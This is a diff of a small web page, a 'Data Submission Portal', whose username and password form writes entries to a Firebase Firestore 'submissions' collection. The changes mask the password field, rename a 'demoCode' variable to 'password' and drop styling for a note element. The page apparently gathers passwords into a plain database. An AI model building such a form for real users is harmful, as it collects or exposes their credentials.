@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Data Submission</title>
+<title>Data Submission Portal</title>
 
 <style>
 * {
@@ -90,13 +89,6 @@ button:disabled {
   margin-top: 18px;
   overflow-wrap: anywhere;
 }
-
-.note {
-  color: #aab7c5;
-  font-size: 11px;
-  line-height: 1.5;
-  margin-top: 14px;
-}
 </style>
 </head>
 
@@ -118,11 +110,11 @@ button:disabled {
       required
     >
 
-    <label>password </label>
+    <label>Password</label>
     <input
-      type="text"
+      type="password"
       id="password"
-      placeholder="password"
+      placeholder="Password"
       maxlength="100"
       required
     >
@@ -138,15 +130,15 @@ button:disabled {
 
 <script type="module">
 
-import { initializeApp }
+import { initializeApp } 
 from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
 
-import {
-  getFirestore,
-  collection,
-  addDoc,
-  serverTimestamp
-}
+import { 
+  getFirestore, 
+  collection, 
+  addDoc, 
+  serverTimestamp 
+} 
 from "https://www.gstatic.com/firebasejs/12.3.0/firebase-firestore.js";
 
 const firebaseConfig = {
@@ -168,19 +160,18 @@ const message = document.getElementById("message");
 form.addEventListener("submit", async (event) => {
   event.preventDefault();
 
-  const username =
-    document.getElementById("username").value.trim();
-
-  const demoCode =
-    document.getElementById("password").value.trim();
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
 
   if (!username || !password) {
     message.textContent = "Please complete both fields.";
+    message.style.color = "#ff7070";
     return;
   }
 
   button.disabled = true;
   message.textContent = "Submitting...";
+  message.style.color = "#ffffff";
 
   try {
     await addDoc(collection(db, "submissions"), {
